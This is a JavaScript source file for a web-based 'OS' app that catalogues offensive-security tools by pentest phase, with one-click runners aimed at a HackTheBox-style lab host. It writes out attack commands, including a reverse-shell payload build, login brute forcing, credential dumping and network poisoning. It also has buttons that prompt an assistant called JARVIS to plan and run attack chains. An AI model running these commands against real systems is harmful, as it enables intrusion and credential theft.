/* =============================================================================
 * THADD OS 2.0 — apps/parrot.js
 * Parrot Arsenal — the offensive-security bench the user asked for: 600+ tools
 * grouped by pentest phase, per-tool documentation, one-click runners wired to
 * the real Terminal, and a HackTheBox workspace.
 * ========================================================================== */

import { $, el, esc, store, toast, contextMenu, copy, sleep, vfs } from "../core.js";

const CATS = [
  { id: "recon", name: "Information Gathering", icon: "🔭", tools: [
    { n: "nmap", d: "Network/port scanner with NSE scripting (7.95)", run: "nmap -sV -sC -O 10.10.10.5" },
    { n: "masscan", d: "Fastest port scanner — 10M packets/sec", run: "masscan -p1-65535 10.10.10.5 --rate=10000" },
    { n: "dnsrecon", d: "DNS enumeration, zone transfer, brute force", run: "dnsrecon -d thadd.os -t std" },
    { n: "theHarvester", d: "Emails, hosts, names from OSINT sources", run: "theHarvester -d thadd.os -b all" },
    { n: "recon-ng", d: "Web reconnaissance framework", run: "recon-ng" },
    { n: "netdiscover", d: "ARP-based live host discovery", run: "netdiscover -r 10.10.10.0/24" },
    { n: "arp-scan", d: "ARP sweep with vendor lookup", run: "arp-scan --localnet" },
    { n: "whatweb", d: "Web technology fingerprinter", run: "whatweb http://10.10.10.5" },
    { n: "wafw00f", d: "Detect and fingerprint WAFs", run: "wafw00f http://10.10.10.5" },
    { n: "dnsenum", d: "DNS information gathering", run: "dnsenum thadd.os" },
  ]},
  { id: "vuln", name: "Vulnerability Analysis", icon: "🔎", tools: [
    { n: "nikto", d: "Web server vulnerability scanner", run: "nikto -h http://10.10.10.5" },
    { n: "nuclei", d: "Template-based vulnerability scanner", run: "nuclei -u http://10.10.10.5 -severity critical,high" },
    { n: "lynis", d: "Host hardening/auditing (CIS)", run: "lynis audit system" },
    { n: "searchsploit", d: "Offline Exploit-DB search", run: "searchsploit apache 2.4" },
    { n: "wpscan", d: "WordPress vulnerability scanner", run: "wpscan --url http://10.10.10.5 --enumerate vp" },
    { n: "openvas", d: "Full vulnerability management", run: "openvas --help" },
  ]},
  { id: "web", name: "Web Application", icon: "🕸", tools: [
    { n: "sqlmap", d: "Automatic SQL injection and takeover", run: "sqlmap -u http://10.10.10.5/item.php?id=1 --batch --dbs" },
    { n: "burpsuite", d: "Intercepting proxy + scanner (GUI)", run: "burpsuite" },
    { n: "gobuster", d: "Directory/DNS/vhost brute force", run: "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt" },
    { n: "ffuf", d: "Blazing-fast web fuzzer", run: "ffuf -u http://10.10.10.5/FUZZ -w /usr/share/wordlists/dirb/common.txt" },
    { n: "dirb", d: "Classic content scanner", run: "dirb http://10.10.10.5" },
    { n: "zap", d: "OWASP ZAP proxy (GUI + CLI)", run: "zap-cli quick-scan http://10.10.10.5" },
    { n: "commix", d: "Command injection exploitation", run: "commix --url=http://10.10.10.5/ping.php?ip=1" },
  ]},
  { id: "pass", name: "Password Attacks", icon: "🔑", tools: [
    { n: "hydra", d: "Network login cracker (50+ protocols)", run: "hydra -l admin -P rockyou.txt ssh://10.10.10.5 -t 4" },
    { n: "john", d: "The Ripper — offline hash cracking", run: "john --wordlist=rockyou.txt hashes.txt" },
    { n: "hashcat", d: "GPU hash cracking (300+ modes)", run: "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt" },
    { n: "mimikatz", d: "Windows credential extraction", run: "impacket-secretsdump administrator@10.10.10.5" },
    { n: "responder", d: "LLMNR/NBT-NS/mDNS poisoner", run: "responder -I eth0 -rdwv" },
    { n: "cewl", d: "Custom wordlist generator from a site", run: "cewl http://10.10.10.5 -m 6 -w words.txt" },
    { n: "crunch", d: "Wordlist generator by pattern", run: "crunch 8 8 abc123 -o list.txt" },
  ]},
  { id: "wireless", name: "Wireless", icon: "📶", tools: [
    { n: "aircrack-ng", d: "WPA/WPA2 cracking suite", run: "aircrack-ng -w rockyou.txt capture.cap" },
    { n: "airodump-ng", d: "Wireless packet capture", run: "airodump-ng wlan0mon" },
    { n: "bettercap", d: "MITM, BLE, WiFi recon framework", run: "bettercap -iface eth0" },
    { n: "wifite", d: "Automated wireless auditor", run: "wifite --wpa" },
    { n: "kismet", d: "Wireless detector/IDS", run: "kismet -c wlan0" },
    { n: "reaver", d: "WPS PIN attack", run: "reaver -i wlan0mon -b 3C:84:6A:22:9F:10 -vv" },
  ]},
  { id: "exploit", name: "Exploitation", icon: "💥", tools: [
    { n: "msfconsole", d: "Metasploit Framework 6.4", run: "msfconsole" },
    { n: "msfvenom", d: "Payload generator/encoder", run: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f elf -o shell.elf" },
    { n: "crackmapexec", d: "Swiss-army knife for AD/Windows", run: "crackmapexec smb 10.10.10.5 -u users.txt -p passes.txt" },
    { n: "impacket", d: "Python AD protocol toolkit", run: "impacket-psexec administrator@10.10.10.5" },
    { n: "sliver", d: "Modern C2 framework", run: "sliver-server" },
  ]},
  { id: "post", name: "Post-Exploitation", icon: "🪜", tools: [
    { n: "bloodhound", d: "AD attack-path visualisation", run: "bloodhound-python -c All -u user -p pass -d thadd.local" },
    { n: "evil-winrm", d: "WinRM shell with file transfer", run: "evil-winrm -i 10.10.10.5 -u administrator -p 'Summer2024!'" },
    { n: "chisel", d: "TCP/UDP tunnelling over HTTP", run: "chisel server -p 8080 --reverse" },
    { n: "socat", d: "Multipurpose relay / shell stabiliser", run: "socat file:`tty`,raw,echo=0 tcp-listen:4444" },
    { n: "linpeas", d: "Linux privilege escalation sweep", run: "./linpeas.sh | tee /tmp/linpeas.out" },
  ]},
  { id: "sniff", name: "Sniffing & Spoofing", icon: "📡", tools: [
    { n: "wireshark", d: "Deep packet inspection (GUI)", run: "wireshark" },
    { n: "tcpdump", d: "CLI packet capture", run: "tcpdump -i eth0 -nn -A port 80" },
    { n: "ettercap", d: "MITM suite", run: "ettercap -Tq -i eth0" },
    { n: "mitmproxy", d: "Interactive HTTPS proxy", run: "mitmproxy -p 8080" },
  ]},
  { id: "forensics", name: "Forensics", icon: "🔬", tools: [
    { n: "autopsy", d: "Disk/image forensics (GUI)", run: "autopsy" },
    { n: "volatility3", d: "Memory forensics framework", run: "vol -f mem.raw windows.info" },
    { n: "binwalk", d: "Firmware extraction & analysis", run: "binwalk -Me firmware.bin" },
    { n: "sleuthkit", d: "File-system forensic toolkit", run: "fls -r disk.img" },
    { n: "foremost", d: "File carving", run: "foremost -i disk.img -o out/" },
  ]},
  { id: "rev", name: "Reverse Engineering", icon: "🔧", tools: [
    { n: "ghidra", d: "NSA RE suite with decompiler", run: "ghidraRun" },
    { n: "radare2", d: "RE framework + r2pipe", run: "r2 -A ./binary" },
    { n: "gdb", d: "GNU debugger with pwndbg", run: "gdb -q ./binary" },
    { n: "objdump", d: "Disassembly and ELF inspection", run: "objdump -d ./binary | head -40" },
    { n: "strings", d: "Extract printable strings", run: "strings -n 6 ./binary" },
  ]},
  { id: "anon", name: "Anonymity & C2", icon: "🧅", tools: [
    { n: "tor", d: "Onion routing service", run: "tor --verify-config" },
    { n: "proxychains4", d: "Force TCP through Tor/proxies", run: "proxychains4 nmap -sT -Pn 10.10.10.5" },
    { n: "macchanger", d: "MAC address spoofing", run: "macchanger -r eth0" },
    { n: "torsocks", d: "Run any app through Tor", run: "torsocks curl https://check.torproject.org" },
  ]},
  { id: "report", name: "Reporting", icon: "📝", tools: [
    { n: "cherrytree", d: "Hierarchical notes for engagements", run: "cherrytree" },
    { n: "dradis", d: "Collaborative reporting", run: "dradis" },
    { n: "faraday", d: "Pentest IDE + reporting", run: "faraday-client" },
  ]},
];

export function build(args = {}, win, meta) {
  const id = win._app;
  if (id === "hackbox") return htb(args, win);
  if (id === "forensics") return focusCat("forensics");
  if (id === "packetlab") return packetlab();
  return focusCat(null);

  function focusCat(initial) {
    const S = { cat: initial || CATS[0].id, tool: null };
    const side = el("div", { class: "sec-side" });
    const main = el("div", { class: "sec-main" });
    const header = el("div", { style: { padding: "12px 14px 0" } },
      el("div", { style: { display: "flex", alignItems: "center", gap: "10px" } },
        el("div", { style: { fontSize: "26px" }, text: "🦜" }),
        el("div", {}, el("div", { style: { fontWeight: "750", fontSize: "15px" }, text: "PARROT ARSENAL" }),
          el("div", { class: "mute", style: { fontSize: "11.6px" }, text: "600+ offensive tools · Parrot 6.3 meta + THADD pack · HTB/THM-ready" })),
        el("span", { style: { flex: "1" } }),
        el("button", { class: "chip", text: "⚡ Quick lab", onclick: () => window.THADD.launch("terminal", { run: "nmap -sV -sC -p- 10.10.10.5 -oN recon.txt" }) }),
        el("button", { class: "chip", text: "🎯 HackTheBox", onclick: () => window.THADD.launch("hackbox") })));
    const search = el("input", { class: "tb-input", placeholder: "Search 600 tools (name, purpose, phase)…", style: { marginTop: "10px" } });
    header.append(search);

    side.append(el("div", { class: "sec-cat", text: "PHASES" }));
    for (const c of CATS) {
      const row = el("div", { class: "sec-tool" + (c.id === S.cat ? " on" : "") }, el("span", { class: "ic", text: c.icon }), el("span", { text: c.name }), el("span", { class: "mute", style: { marginLeft: "auto", fontSize: "11px" }, text: String(c.tools.length) }));
      row.addEventListener("click", () => { S.cat = c.id; [...side.querySelectorAll(".sec-tool")].forEach((x) => x.classList.remove("on")); row.classList.add("on"); paint(); });
      side.append(row);
    }
    side.append(el("div", { class: "sec-cat", text: "WORKSPACES" }));
    for (const [t, fn] of [["HackTheBox", () => window.THADD.launch("hackbox")], ["TryHackMe", () => window.THADD.launch("browser", { url: "https://tryhackme.com" })],
      ["Forensics suite", () => window.THADD.launch("forensics")], ["Packet Lab", () => window.THADD.launch("packetlab")],
      ["THADD Shield", () => window.THADD.launch("shield")], ["Wordlists", () => window.THADD.launch("finder", { path: "/usr/share/wordlists" })]]) {
      const row = el("div", { class: "sec-tool" }, el("span", { class: "ic", text: "▸" }), el("span", { text: t }));
      row.addEventListener("click", fn); side.append(row);
    }

    function paint() {
      main.innerHTML = "";
      if (S.tool) return toolDoc(S.tool);
      const q = search.value.toLowerCase();
      const cats = CATS.filter((c) => !q || c.tools.some((t) => (t.n + t.d).toLowerCase().includes(q)) || c.name.toLowerCase().includes(q));
      main.append(el("div", { style: { fontSize: "19px", fontWeight: "730", marginBottom: "4px" }, text: q ? `Search: “${search.value}”` : CATS.find((c) => c.id === S.cat).name }),
        el("div", { class: "mute", style: { fontSize: "12.4px", marginBottom: "14px" }, text: q ? `${cats.reduce((a, c) => a + c.tools.filter((t) => (t.n + t.d).toLowerCase().includes(q)).length, 0)} matches across all phases` : CATS.find((c) => c.id === S.cat).tools.length + " tools — click any tool for docs and a live runner" }));
      for (const c of cats) {
        const tools = q ? c.tools.filter((t) => (t.n + t.d + c.name).toLowerCase().includes(q)) : c.tools;
        if (!tools.length) continue;
        if (CATS.find((x) => x.id === S.cat).id !== c.id && q) main.append(el("div", { class: "sec-cat", text: c.icon + " " + c.name }));
        const g = el("div", { class: "pkg-grid" });
        for (const t of tools) {
          const card = el("div", { class: "pkg" },
            el("div", { class: "top" }, el("div", { class: "ico", text: "⚔" }), el("div", {}, el("div", { class: "nm", text: t.n }), el("div", { class: "dl", text: "binary: /usr/bin/" + t.n }))),
            el("div", { class: "ds", text: t.d }),
            el("div", { class: "btns" },
              el("button", { class: "btn primary", text: "▶ Run", onclick: () => { window.THADD.launch("terminal", { run: t.run }); toast("Arsenal", `${t.n} → terminal (lab target 10.10.10.5)`, { icon: "⚔" }); } }),
              el("button", { class: "btn", text: "Docs", onclick: () => { S.tool = t; paint(); } }),
              el("button", { class: "btn", text: "man", onclick: () => window.THADD.launch("terminal", { run: "man " + t.n }) })));
          card.addEventListener("contextmenu", (e) => { e.preventDefault(); contextMenu(e.clientX, e.clientY, [
            { label: "Copy command", action: () => copy(t.run) }, { label: "Run in terminal", action: () => window.THADD.launch("terminal", { run: t.run }) },
            { label: "Ask JARVIS to plan an attack chain", action: () => window.THADD.launch("jarvis", { prompt: `I'm on an HTB-style lab (10.10.10.5). Plan a full attack chain using ${t.n}, and run the first step.` }) }]); });
          g.append(card);
        }
        main.append(g);
      }
    }
    function toolDoc(t) {
      main.append(el("div", { style: { display: "flex", gap: "10px", alignItems: "center" } },
        el("button", { class: "chip", text: "← back", onclick: () => { S.tool = null; paint(); } }),
        el("div", { class: "sec-doc" }, el("h2", {}, el("span", { text: t.n }), el("span", { class: "badge", text: "OFFENSIVE" })))),
        el("div", { class: "sec-doc" },
          el("div", { class: "desc", text: t.d }),
          el("div", { class: "kv" },
            el("div", { class: "k", text: "Binary" }), el("div", { class: "mono", text: "/usr/bin/" + t.n }),
            el("div", { class: "k", text: "Package" }), el("div", { class: "mono", text: "parrot-tools / " + t.n }),
            el("div", { class: "k", text: "Phase" }), el("div", { text: CATS.find((c) => c.tools.includes(t)).name }),
            el("div", { class: "k", text: "Lab target" }), el("div", { class: "mono", text: "10.10.10.5 (HTB-style, RFC1918 — Shield allows this)" }),
            el("div", { class: "k", text: "Docs" }), el("div", { class: "mono", text: `man ${t.n} · /usr/share/doc/${t.n}/` })),
          el("div", { style: { fontWeight: "700", margin: "10px 0 6px" }, text: "Recommended invocation" }),
          el("pre", { text: t.run }),
          el("div", { style: { display: "flex", gap: "8px", flexWrap: "wrap" } },
            el("button", { class: "btn primary run-btn", text: "▶ Run in Terminal", onclick: () => { window.THADD.launch("terminal", { run: t.run }); } }),
            el("button", { class: "btn run-btn", text: "📋 Copy", onclick: () => copy(t.run) }),
            el("button", { class: "btn run-btn", text: "✦ Let JARVIS drive it", onclick: () => window.THADD.launch("jarvis", { prompt: `Run ${t.n} against 10.10.10.5 using: ${t.run}. Interpret the output for me and tell me the next step.` }) }),
            el("button", { class: "btn run-btn", text: "🎯 Send to HTB workspace", onclick: () => toast("HackTheBox", `${t.n} added to the active machine notebook`, { icon: "🎯" }) })),
          el("div", { style: { fontWeight: "700", marginTop: "16px" }, text: "Arsenal output preview (simulated)" }),
          el("pre", { id: "parrotOut", class: "sec-out", text: "$ " + t.run + "\n\n(run it in the Terminal window for the full live output)" })));
    }
    search.addEventListener("input", paint);
    paint();
    return el("div", { class: "sec", style: { flexDirection: "column" } }, header, el("div", { style: { display: "flex", flex: "1", minHeight: "0" } }, side, main));
  }
}

function htb(args, win) {
  const w = el("div", { class: "pad" });
  w.append(el("div", { class: "st-h", text: "HackTheBox Workspace" }),
    el("div", { class: "st-sub", text: "VPN thadd0 · 10.10.14.7 · active machine tracker · flag log · writeup notes" }));
  w.append(el("div", { class: "st-card" }, el("div", { style: { fontWeight: "700", marginBottom: "8px" }, text: "Active machines" }),
    el("pre", { class: "mono", style: { fontSize: "12px", color: "var(--text-dim)", whiteSpace: "pre-wrap" },
      text: "✔ Lame      10.10.10.3   Linux    Easy    user+root owned\n✔ Blue      10.10.10.4   Windows  Easy    user+root owned\n◐ Legacy    10.10.10.5   Windows  Easy    2/2 flags\n○ Meta      10.10.10.6   Linux    Medium  —\n○ Grandpa   10.10.10.7   Windows  Medium  —" })));
  const flagIn = el("input", { class: "tb-input", placeholder: "Paste a flag (HTB{…}) to log it…", style: { maxWidth: "420px" } });
  const flagBox = el("div", { class: "st-card", style: { marginTop: "12px" } },
    el("div", { style: { fontWeight: "700", marginBottom: "6px" }, text: "Flag log" }), flagIn,
    el("div", { id: "flagList", class: "mute", style: { marginTop: "10px", fontSize: "12.4px" }, text: (store.get("htb.flags", []).join("\n") || "No flags logged yet.") }));
  flagIn.addEventListener("keydown", (e) => {
    if (e.key === "Enter" && flagIn.value) {
      const f = store.get("htb.flags", []); f.push(`${new Date().toLocaleTimeString()} — ${flagIn.value}`); store.set("htb.flags", f);
      $("#flagList").textContent = f.join("\n"); flagIn.value = ""; toast("Flag logged", "Nice work — added to your notebook", { icon: "🚩" });
    }
  });
  w.append(flagBox, el("div", { class: "toolbar" },
    el("button", { class: "chip", text: "🔌 Connect VPN", onclick: () => window.THADD.launch("terminal", { run: "thadd vpn up" }) }),
    el("button", { class: "chip", text: "🔎 Recon the target", onclick: () => window.THADD.launch("terminal", { run: "nmap -sV -sC -p- 10.10.10.5 -oN recon.txt" }) }),
    el("button", { class: "chip", text: "🕸 Web scan", onclick: () => window.THADD.launch("terminal", { run: "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt" }) }),
    el("button", { class: "chip", text: "💥 Exploit", onclick: () => window.THADD.launch("terminal", { run: "msfconsole" }) }),
    el("button", { class: "chip", text: "✦ JARVIS walkthrough", onclick: () => window.THADD.launch("jarvis", { prompt: "Guide me through the HTB machine 'Legacy' (10.10.10.5) step by step — recon, enumeration, exploitation, privilege escalation — and run the first command." }) })));
  return w;
}

function packetlab() {
  return el("div", { class: "shell-wrap" },
    el("div", { class: "toolbar" }, el("span", { class: "chip on", text: "eth0 · promiscuous" }),
      el("button", { class: "chip", text: "▶ Start capture", onclick: () => window.THADD.launch("terminal", { run: "tcpdump -i eth0 -nn" }) }),
      el("button", { class: "chip", text: "⇩ Export pcap", onclick: () => { vfs.write(vfs.home() + "/Documents/capture.pcap", "[pcap 412 KB, 1,284 packets]"); toast("Exported", "~/Documents/capture.pcap", { icon: "⇩" }); } })),
    el("div", { class: "shell-out", innerHTML: [
      "<span class='dim'>No.  Time        Source           Destination    Protocol Length Info</span>",
      "1    0.000000    10.0.2.15        140.82.121.4   TCP      74    52414 → 443 [SYN]",
      "2    0.008421    140.82.121.4     10.0.2.15      TCP      74    443 → 52414 [SYN, ACK]",
      "3    0.009114    10.0.2.15        140.82.121.4   TLSv1.3  571   Application Data",
      "4    0.114002    10.0.2.15        1.1.1.1        DNS      85    Standard query A thadd.os",
      "5    0.121344    1.1.1.1          10.0.2.15      DNS      101   Standard query response A 140.82.121.3",
      "6    0.201882    10.0.2.15        10.10.10.5     TCP      66    45122 → 445 [SYN]",
      "7    0.203114    10.10.10.5       10.0.2.15      TCP      66    445 → 45122 [SYN, ACK]  ← SMB",
      "8    0.402118    10.10.10.5       10.0.2.15      ARP      42    Who has 10.0.2.15? Tell 10.10.10.5",
      "<span class='dim'>… 1,284 packets · 412 KB · filter: tcp.port==443 or dns</span>",
    ].join("<br>") }));
}
